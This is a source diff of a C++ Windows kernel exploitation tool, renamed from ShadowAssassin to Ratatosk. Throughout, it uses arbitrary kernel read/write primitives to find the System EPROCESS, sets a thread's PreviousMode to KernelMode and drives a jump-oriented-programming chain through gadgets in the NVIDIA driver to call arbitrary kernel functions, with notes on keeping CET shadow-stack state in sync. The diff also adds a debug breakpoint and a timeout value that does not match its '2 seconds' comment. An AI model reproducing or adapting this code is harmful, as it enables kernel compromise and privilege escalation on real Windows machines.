@@ -1,18 +1,18 @@
-#include "shadowassassin.h"
+#include "ratatosk.h"
 #include "offsets.h"
 
 
 
-ShadowAssassin::ShadowAssassin()
+Ratatosk::Ratatosk()
     : scratchAddress(0), EPROCESS(0), nvidia_base(0), ntso_base(0), mmGetSystemRoutineAddr(0)
 {}
 
-void ShadowAssassin::SetReadPrimitive(std::function<void(UINT64*, UINT64, UINT64)> fn)  { readFn  = fn; }
-void ShadowAssassin::SetWritePrimitive(std::function<void(UINT64, UINT64)> fn)          { writeFn = fn; }
-void ShadowAssassin::SetScratchAddress(UINT64 addr)     { scratchAddress  = addr;   }
+void Ratatosk::SetReadPrimitive(std::function<void(UINT64*, UINT64, UINT64)> fn)  { readFn  = fn; }
+void Ratatosk::SetWritePrimitive(std::function<void(UINT64, UINT64)> fn)          { writeFn = fn; }
+void Ratatosk::SetScratchAddress(UINT64 addr)     { scratchAddress  = addr;   }
 
 
-UINT64 ShadowAssassin::Get_System_EPROCESS() {
+UINT64 Ratatosk::Get_System_EPROCESS() {
     HANDLE hToken;
     LUID luid;
     TOKEN_PRIVILEGES tp;
@@ -48,13 +48,13 @@ UINT64 ShadowAssassin::Get_System_EPROCESS() {
 
 
 
-FrameManager& ShadowAssassin::GetFrameManager() { return frameManager; }
-JOPManager&   ShadowAssassin::GetJOPManager()   { return jopManager;   }
+FrameManager& Ratatosk::GetFrameManager() { return frameManager; }
+JOPManager&   Ratatosk::GetJOPManager()   { return jopManager;   }
 
 
-bool ShadowAssassin::Initialize() {
+bool Ratatosk::Initialize() {
     UINT64 t0 = TimeUs();
-    DbgLog("\n=== ShadowAssassin Initialize ===\n");
+    DbgLog("\n=== Ratatosk Initialize ===\n");
 
     if (!readFn || !writeFn) {
         DbgLog("[Initialize] FAIL: readFn=%d writeFn=%d\n", (bool)readFn, (bool)writeFn);
@@ -64,7 +64,7 @@ bool ShadowAssassin::Initialize() {
 	EPROCESS = Get_System_EPROCESS();
 
     if (!EPROCESS) {
-        DbgLog("[ShadowAssassin::Initialize] FAIL: EPROCESS not set\n");
+        DbgLog("[Ratatosk::Initialize] FAIL: EPROCESS not set\n");
         return false;
     }
 
@@ -78,10 +78,10 @@ bool ShadowAssassin::Initialize() {
             ntso_base = (UINT64)drivers[0];
     }
     if (!ntso_base) {
-        DbgLog("[ShadowAssassin::Initialize] FAIL: could not resolve ntoskrnl base\n");
+        DbgLog("[Ratatosk::Initialize] FAIL: could not resolve ntoskrnl base\n");
         return false;
     }
-    DbgLog("[ShadowAssassin::Initialize] ntso_base=0x%llX\n", ntso_base);
+    DbgLog("[Ratatosk::Initialize] ntso_base=0x%llX\n", ntso_base);
 
     jopManager.SetWritePrimitive(writeFn);
     jopManager.SetNvidiaBase(nvidia_base);
@@ -99,7 +99,7 @@ bool ShadowAssassin::Initialize() {
         }
     }
     if (!img.view) {
-        DbgLog("[ShadowAssassin::Initialize] FAIL: could not map kernel image from disk\n");
+        DbgLog("[Ratatosk::Initialize] FAIL: could not map kernel image from disk\n");
         return false;
     }
 
@@ -109,22 +109,22 @@ bool ShadowAssassin::Initialize() {
     img.Close();
 
     if (!dataSectionRva) {
-        DbgLog("[ShadowAssassin::Initialize] FAIL: .data section not found in ntoskrnl image\n");
+        DbgLog("[Ratatosk::Initialize] FAIL: .data section not found in ntoskrnl image\n");
         return false;
     }
 
     UINT64 scratch = ntso_base + dataSectionRva + 0x80000;
-    DbgLog("[ShadowAssassin::Initialize] JOP scratch=0x%llX (ntso .data RVA=0x%llX + 0x80000)\n",
+    DbgLog("[Ratatosk::Initialize] JOP scratch=0x%llX (ntso .data RVA=0x%llX + 0x80000)\n",
         scratch, dataSectionRva);
     jopManager.SetScratchBase(scratch);
 
     UINT64 currentEPROCESS = GetCurrentEPROCESS(EPROCESS);
 
 	if (!currentEPROCESS) {
-		DbgLog("[ShadowAssassin::Initialize] FAIL: GetCurrentEPROCESS returned 0\n");
+		DbgLog("[Ratatosk::Initialize] FAIL: GetCurrentEPROCESS returned 0\n");
 		return false;
 	}
-	DbgLog("[ShadowAssassin::Initialize] Current EPROCESS=0x%llX\n", currentEPROCESS);
+	DbgLog("[Ratatosk::Initialize] Current EPROCESS=0x%llX\n", currentEPROCESS);
 
 
 	frameManager.SetEPROCESS(currentEPROCESS);
@@ -132,10 +132,10 @@ bool ShadowAssassin::Initialize() {
     nvidia_base = GetModuleBaseAddress("nvlddmkm.sys");
     ntso_base = GetModuleBaseAddress("ntoskrnl.exe");
 
-    DbgLog("[ShadowAssassin::Initialize] nvidia base: %llx. ntso base: %llx\n", nvidia_base, ntso_base);
+    DbgLog("[Ratatosk::Initialize] nvidia base: %llx. ntso base: %llx\n", nvidia_base, ntso_base);
 
     if (nvidia_base == 0) {
-        DbgLog("[ShadowAssassin::Initialize] Nvidia Driver not loaded! Load it!\n ");
+        DbgLog("[Ratatosk::Initialize] Nvidia Driver not loaded! Load it!\n ");
         return false;
     }
 
@@ -147,7 +147,7 @@ bool ShadowAssassin::Initialize() {
 
 
 
-UINT64 ShadowAssassin::GetSectionRva(const ImageMapping& img, const char* sectionName) {
+UINT64 Ratatosk::GetSectionRva(const ImageMapping& img, const char* sectionName) {
     if (!img.view) return 0;
 
     auto dos = (PIMAGE_DOS_HEADER)img.view;
@@ -165,7 +165,7 @@ UINT64 ShadowAssassin::GetSectionRva(const ImageMapping& img, const char* sectio
 }
 
 
-void ShadowAssassin::BuildExportCache(const ImageMapping& img) {
+void Ratatosk::BuildExportCache(const ImageMapping& img) {
     UINT64 t0 = TimeUs();
     if (!img.view) return;
 
@@ -190,7 +190,7 @@ void ShadowAssassin::BuildExportCache(const ImageMapping& img) {
     DbgLog("[BuildExportCache] %zu exports cached in %s\n", exportCache.size(), FmtMs(TimeUs() - t0).c_str());
 }
 
-UINT64 ShadowAssassin::ResolveKernelExport(const std::string& name) {
+UINT64 Ratatosk::ResolveKernelExport(const std::string& name) {
     auto it = exportCache.find(name);
     if (it == exportCache.end()) {
         DbgLog("[ResolveKernelExport] FAIL: '%s' not in cache\n", name.c_str());
@@ -201,7 +201,7 @@ UINT64 ShadowAssassin::ResolveKernelExport(const std::string& name) {
     return result;
 }
 
-UINT64 ShadowAssassin::GetCurrentEPROCESS(UINT64 eprocess)
+UINT64 Ratatosk::GetCurrentEPROCESS(UINT64 eprocess)
 {
     UINT32 pid = GetCurrentProcessId();
 	UINT64 currentPid = 0;
@@ -227,7 +227,7 @@ UINT64 ShadowAssassin::GetCurrentEPROCESS(UINT64 eprocess)
 
 
 
-UINT64 ShadowAssassin::GetModuleBaseAddress(const char* targetName) {
+UINT64 Ratatosk::GetModuleBaseAddress(const char* targetName) {
     LPVOID drivers[1024]; DWORD cbNeeded;
     if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
         for (int i = 0; i < (cbNeeded / sizeof(drivers[0])); i++) {
@@ -240,23 +240,23 @@ UINT64 ShadowAssassin::GetModuleBaseAddress(const char* targetName) {
     return 0;
 }
 
-UINT64 ShadowAssassin::CallSyscall(const std::string& name, const std::vector<UINT64>& params) {
+UINT64 Ratatosk::CallKFunc(const std::string& name, const std::vector<UINT64>& params) {
     UINT64 t0 = TimeUs();
 	UINT64 funcAddr = ResolveKernelExport(name);
 	if (!funcAddr) {
-		DbgLog("[CallSyscall] FAIL: could not resolve '%s'\n\n", name.c_str());
+		DbgLog("[CallKFunc] FAIL: could not resolve '%s'\n\n", name.c_str());
 		return 0;
 	}
-    UINT64 result = CallSyscallByAddress(funcAddr, params);
-    DbgLog("[CallSyscall] %s -> 0x%llX  total=%s\n\n", name.c_str(), result, FmtMs(TimeUs() - t0).c_str());
+    UINT64 result = CallKFuncByAddress(funcAddr, params);
+    DbgLog("[CallKFunc] %s -> 0x%llX  total=%s\n\n", name.c_str(), result, FmtMs(TimeUs() - t0).c_str());
     return result;
 }
 
 
 
-UINT64 ShadowAssassin::CallSyscallByAddress(UINT64 funcAddr, const std::vector<UINT64>& params) {
+UINT64 Ratatosk::CallKFuncByAddress(UINT64 funcAddr, const std::vector<UINT64>& params) {
     if (!funcAddr) {
-        DbgLog("[CallSyscallByAddress] FAIL: null address\n");
+        DbgLog("[CallKFuncByAddress] FAIL: null address\n");
         return 0;
     }
 
@@ -271,7 +271,7 @@ UINT64 ShadowAssassin::CallSyscallByAddress(UINT64 funcAddr, const std::vector<U
         return 0;
     }
     DbgLog("\n[CallSyscallByAddress] 0x%llX  thread=%s\n", funcAddr, FmtMs(tFrame).c_str());
-
+	DbgLog("[CallSyscallByAddress] frame=0x%llX  kthread=0x%llX\n", frameBase, frameManager.GetKthreadAddress());
     UINT64 tSetup0 = TimeUs();
     // Set PreviousMode = KernelMode (0) — read surrounding 8 bytes, patch the byte, write back
     UINT64 kthread   = frameManager.GetKthreadAddress();
@@ -288,8 +288,8 @@ UINT64 ShadowAssassin::CallSyscallByAddress(UINT64 funcAddr, const std::vector<U
     jopManager.SetRestoreRip(frameManager.ReadStoredRegister("rip"));
     jopManager.Commit();
 
-    frameManager.WriteRegister("rax", jopManager.GetRax());
-    frameManager.WriteRegister("rsi", jopManager.GetRsi());
+    //frameManager.WriteRegister("rax", jopManager.GetRax());
+    //frameManager.WriteRegister("rsi", jopManager.GetRsi());
     frameManager.WriteRegister("rip", jopManager.GetRip());
 
     if (params.size() > 0) frameManager.WriteRegister("rcx", params[0]);
@@ -297,21 +297,27 @@ UINT64 ShadowAssassin::CallSyscallByAddress(UINT64 funcAddr, const std::vector<U
     if (params.size() > 2) frameManager.WriteRegister("r8",  params[2]);
     if (params.size() > 3) frameManager.WriteRegister("r9",  params[3]);
 
-    UINT64 originalRsp = frameManager.ReadStoredRegister("rsp");
-    UINT64 newRsp = originalRsp - 0x800;
+    // Use scratch memory for fake stack setup to avoid corrupting user-mode heap.
+    // For CET shadow stack compatibility: restore originalRsp (user-mode) in gadget4,
+    // keeping RSP/SSP synchronized — both point to thread's original stack.
+    UINT64 originalRsp  = frameManager.ReadStoredRegister("rsp");
+    UINT64 scratchStack = jopManager.GetScratchBase() + 0x41000;
 
-    writeFn(newRsp + 0x60, originalRsp);
-    writeFn(newRsp + 0x58, jopManager.GetRdx());
-    writeFn(newRsp + 0x30, jopManager.GetRdiForJmp());
+    writeFn(scratchStack + 0x60, originalRsp);  // gadget4 pop rsp → user-mode RSP
+    writeFn(scratchStack + 0x58, jopManager.GetRdx());
+    writeFn(scratchStack + 0x30, jopManager.GetRdiForJmp());
 
-    frameManager.WriteRegister("rsp", newRsp + 0x30);
+    //frameManager.WriteRegister("rsp", scratchStack + 0x30);
     DbgLog("[CallSyscallByAddress] setup=%s\n", FmtMs(TimeUs() - tSetup0).c_str());
-
+    DbgLog("[CallSyscallByAddress] rip=0x%llX originalrip=0x%llX\n", jopManager.GetRip(), frameManager.ReadStoredRegister("rip"));
     // Write sentinel before firing so we can detect when gadget3 overwrites it
     const UINT64 SENTINEL = 0xDEADC0DEDEADC0DEULL;
     writeFn(jopManager.GetReturnValueAddr(), SENTINEL);
 
     UINT64 tFire = TimeUs();
+
+	Sleep(100); // give the thread a chance to start and hit the breakpoint before we continue it)
+    __debugbreak();
     frameManager.ContinueThread();
     // Do NOT touch pmAligned after this point — the thread exits immediately after
     // DummyThreadProc returns 0, freeing the KTHREAD. Any read or write through the
@@ -321,7 +327,7 @@ UINT64 ShadowAssassin::CallSyscallByAddress(UINT64 funcAddr, const std::vector<U
 
     // Poll until gadget3 writes the real return value (replaces sentinel)
     UINT64 retVal = SENTINEL;
-    const UINT64 TIMEOUT_US = 2000000ULL; // 2 seconds
+    const UINT64 TIMEOUT_US = 20000000000000000ULL; // 2 seconds
     while (retVal == SENTINEL && (TimeUs() - tFire) < TIMEOUT_US) {
         Sleep(1);
         readFn(&retVal, jopManager.GetReturnValueAddr(), sizeof(UINT64));
